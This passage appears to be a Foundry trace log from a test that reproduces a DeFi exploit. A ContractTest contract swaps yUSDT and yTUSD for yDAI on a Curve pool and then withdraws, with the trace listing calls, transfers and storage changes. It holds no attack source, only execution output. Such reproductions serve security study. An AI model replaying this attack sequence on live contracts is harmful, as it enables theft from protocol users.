+    │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01, 0), 3) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F], 1304349023930152708453 [1.304e21], 1414550289340267075470830 [1.414e24]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000593b4c
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0x493C57C4763932315A328269E1ADaD09653B9081::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [4773] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   ├─ [2257] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::delegateToImplementation(0x70a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01) [staticcall]
+    │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 1133752629097174055 [1.133e18]
+    │   │   │   ├─ [31906] yUSDC::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [1315] CentreUSDC::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 40100930833 [4.01e10]
+    │   │   │   │   │   └─ ← [Return] 40100930833 [4.01e10]
+    │   │   │   │   ├─ [6496] 0x9bA00D6856a4eDF4665BcA2C2309936572473B7E::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003aa3277ba453fdb0c803521
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003aa3277ba453fdb0c803521
+    │   │   │   │   │   └─ ← [Return] 356118867834 [3.561e11]
+    │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 0), 2) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 2101138810 [2.101e9], 815523096620 [8.155e11]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000f952a0
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 1259083362487637320 [1.259e18]
+    │   │   │   ├─ [29076] yUSDT::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 40817840891 [4.081e10]
+    │   │   │   │   ├─ [803] 0x71fc860F7D3A592A4a98740e39dB31d25db65ae8::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [15130] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 0), 0) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804948162090517 [1.38e16], 1820383570136713332186 [1.82e21]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000bbde
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [3780] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   ├─ [2257] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::delegateToImplementation(0x70a0823100000000000000000000000083f798e925bcd4017eb265844fddabb448f1707d) [staticcall]
+    │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 7983010 [7.983e6]
+    │   │   │   ├─ [31690] yTUSD::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [1185] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   ├─ [486] 0xB650eb28d35691dd1BD481325D40E65273844F9b::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
+    │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
+    │   │   │   │   ├─ [6496] 0x4DA9b813057D04BAef4e5800E36083717b4a0341::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(0x0000000000085d4780B73119b644AE5ecd22b376) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(0x0000000000085d4780B73119b644AE5ecd22b376) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
+    │   │   │   │   │   └─ ← [Return] 280671118812599902212786 [2.806e23]
+    │   │   │   │   ├─ [15130] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x73a052500105205d34Daf004eAb301916DA8190f, 0), 0) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804948162090517 [1.38e16], 1820383570136713332186 [1.82e21]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000bbde
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0x49f4592E641820e928F9919Ef4aBd92a719B4b49::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 1239753704121538299 [1.239e18]
+    │   │   │   ├─ [7187] yUSDT::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 4869389952115967126106 [4.869e21])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 4869389952115967126106 [4.869e21])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 115792089237316195423570985008687907853269984665640564034588194055797162513829 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000000107f85c4a50d895ea5a → 0
+    │   │   │   │   │   @ 0xd4323eae345c302632428595ef8598a8d956b13b06a6fc8511bc488b90519d29: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffef807a3b5af276a15a5
+    │   │   │   │   │   @ 0x2b326c195b4bf13398fccd87e6e23fac6ff3d9dc0e93a62080b304ab12378cdd: 0x000000000000000000000000000000000000000000000006b8a71f56e16f6744 → 0x00000000000000000000000000000000000000000000010eb10369a7ba05519e
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4148] yDAI::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 51086454939086230170032 [5.108e22])
+    │   │   │   │   ├─ emit Transfer(from: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 51086454939086230170032 [5.108e22])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x2b326c195b4bf13398fccd87e6e23fac6ff3d9dc0e93a62080b304ab12378cdd: 0x000000000000000000000000000000000000000000002af9a13eded0e0490b74 → 0x0000000000000000000000000000000000000000000020283a439b5b05a061c4
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000a039d3dffc0917b4070f → 0x00000000000000000000000000000000000000000000ab0b3adb3f7ef25cb0bf
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ emit TokenExchange(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 2, param2: 4869389952115967126106 [4.869e21], param3: 0, param4: 51086454939086230170032 [5.108e22])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ad0: 0x000000000000000000000000000000000000000000000006820d3d62fb993299 → 0x00000000000000000000000000000000000000000000010e7a6987b3d42f1cf2
+    │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace: 0x000000000000000000000000000000000000000000002af158c9ac7e405ce686 → 0x00000000000000000000000000000000000000000000201f63f4c67f276d6acc
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [886] yTUSD::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 94020924071307702862489 [9.402e22]
+    │   │   ├─ [196168] CurveFiSwap::exchange(3, 0, 94020924071307702862489 [9.402e22], 0)
+    │   │   │   ├─ [35413] yDAI::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [602] DAI::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1052943406217363306950338 [1.052e24]
+    │   │   │   │   ├─ [6496] 0xfC1E690f61EFd961294b3e1Ce3313fBD8aa4f85d::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   └─ ← [Return] 442188359110421701547003 [4.421e23]
+    │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01, 0), 3) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F], 1304349023930152708453 [1.304e21], 1414550289340267075470830 [1.414e24]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000593b4c
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0x493C57C4763932315A328269E1ADaD09653B9081::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [4773] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   ├─ [2257] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::delegateToImplementation(0x70a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01) [staticcall]
+    │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 1133752629097174055 [1.133e18]
+    │   │   │   ├─ [31906] yUSDC::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [1315] CentreUSDC::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 40100930833 [4.01e10]
+    │   │   │   │   │   └─ ← [Return] 40100930833 [4.01e10]
+    │   │   │   │   ├─ [6496] 0x9bA00D6856a4eDF4665BcA2C2309936572473B7E::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003aa3277ba453fdb0c803521
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003aa3277ba453fdb0c803521
+    │   │   │   │   │   └─ ← [Return] 356118867834 [3.561e11]
+    │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 0), 2) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 2101138810 [2.101e9], 815523096620 [8.155e11]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000f952a0
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 1259083362487637320 [1.259e18]
+    │   │   │   ├─ [29076] yUSDT::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 40817840891 [4.081e10]
+    │   │   │   │   ├─ [803] 0x71fc860F7D3A592A4a98740e39dB31d25db65ae8::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [15130] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 0), 0) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804948162090517 [1.38e16], 1820383570136713332186 [1.82e21]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000bbde
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [3780] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   ├─ [2257] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::delegateToImplementation(0x70a0823100000000000000000000000083f798e925bcd4017eb265844fddabb448f1707d) [staticcall]
+    │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 7983010 [7.983e6]
+    │   │   │   ├─ [31690] yTUSD::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [1185] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   ├─ [486] 0xB650eb28d35691dd1BD481325D40E65273844F9b::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
+    │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
+    │   │   │   │   ├─ [6496] 0x4DA9b813057D04BAef4e5800E36083717b4a0341::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(0x0000000000085d4780B73119b644AE5ecd22b376) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(0x0000000000085d4780B73119b644AE5ecd22b376) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
+    │   │   │   │   │   └─ ← [Return] 280671118812599902212786 [2.806e23]
+    │   │   │   │   ├─ [15130] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x73a052500105205d34Daf004eAb301916DA8190f, 0), 0) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804948162090517 [1.38e16], 1820383570136713332186 [1.82e21]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000bbde
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0x49f4592E641820e928F9919Ef4aBd92a719B4b49::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 1239753704121538299 [1.239e18]
+    │   │   │   ├─ [7187] yTUSD::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 94020924071307702862489 [9.402e22])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 94020924071307702862489 [9.402e22])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 115792089237316195423570985008687907853269984665640563945436659936605426777446 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000013e8e26f0aa62d528299 → 0
+    │   │   │   │   │   @ 0x2b326c195b4bf13398fccd87e6e23fac6ff3d9dc0e93a62080b304ab12378cdd: 0x00000000000000000000000000000000000000000000007cfe766a3580e93451 → 0x000000000000000000000000000000000000000000001465e0e574dbae3bb6ea
+    │   │   │   │   │   @ 0xd4323eae345c302632428595ef8598a8d956b13b06a6fc8511bc488b90519d29: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffec171d90f559d2ad7d66
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4148] yDAI::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 103287972520796381998081 [1.032e23])
+    │   │   │   │   ├─ emit Transfer(from: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 103287972520796381998081 [1.032e23])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000ab0b3adb3f7ef25cb0bf → 0x00000000000000000000000000000000000000000000c0ea7b6c14072ae01cc0
+    │   │   │   │   │   @ 0x2b326c195b4bf13398fccd87e6e23fac6ff3d9dc0e93a62080b304ab12378cdd: 0x0000000000000000000000000000000000000000000020283a439b5b05a061c4 → 0x000000000000000000000000000000000000000000000a48f9b2c6d2cd1cf5c3
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ emit TokenExchange(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 3, param2: 94020924071307702862489 [9.402e22], param3: 0, param4: 103287972520796381998081 [1.032e23])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace: 0x00000000000000000000000000000000000000000000201f63f4c67f276d6acc → 0x000000000000000000000000000000000000000000000a3f04980f03ea7f6e2b
+    │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ad1: 0x00000000000000000000000000000000000000000000007b00bdf05ea823d300 → 0x000000000000000000000000000000000000000000001463e32cfb04d5765598
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [952] yDAI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 911019796329605082651840 [9.11e23]
+    │   │   ├─ [80157] yDAI::withdraw(911019796329605082651840 [9.11e23])
+    │   │   │   ├─ [602] DAI::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1052943406217363306950338 [1.052e24]
+    │   │   │   ├─ [6496] 0xfC1E690f61EFd961294b3e1Ce3313fBD8aa4f85d::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [staticcall]
+    │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   └─ ← [Return] 442188359110421701547003 [4.421e23]
+    │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01, 0), 3) [staticcall]
